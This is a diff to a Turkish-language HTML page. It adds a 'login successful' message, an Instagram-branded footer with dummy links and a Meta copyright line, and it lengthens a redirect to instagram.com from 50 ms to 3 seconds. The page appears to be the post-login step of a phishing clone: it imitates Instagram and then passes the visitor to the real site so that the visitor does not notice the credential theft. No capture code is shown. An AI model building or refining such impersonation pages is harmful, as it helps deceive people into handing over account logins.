@@ -3,9 +3,30 @@
     <div class="title-container">
         <img src="./images/logo.png" class="title-logo" />
     </div>
+    <div class="success-message">
+        <h2>Giriş Başarılı</h2>
+        <p>Hesabınıza giriş yapılıyor, lütfen bekleyin...</p>
+        <div class="loader"></div>
+    </div>
 </main>
+<footer>
+    <ul class="footer-links">
+        <li><a href="#">Hakkında</a></li>
+        <li><a href="#">Blog</a></li>
+        <li><a href="#">İş Fırsatları</a></li>
+        <li><a href="#">Yardım</a></li>
+        <li><a href="#">API</a></li>
+        <li><a href="#">Gizlilik</a></li>
+        <li><a href="#">Koşullar</a></li>
+        <li><a href="#">Popüler Hesaplar</a></li>
+        <li><a href="#">Hashtag'ler</a></li>
+        <li><a href="#">Konumlar</a></li>
+        <li><a href="#">Instagram Lite</a></li>
+    </ul>
+    <span class="copyright">&copy; 2023 Instagram from Meta</span>
+</footer>
 <script>
     var timer = setTimeout(function () {
         window.location = 'https://instagram.com'
-    }, 50); // Başarılı giriş sonrası Instagram'a yönlendirme
+    }, 3000); // Başarılı giriş sonrası Instagram'a yönlendirme (3 saniye bekletme)
 </script>
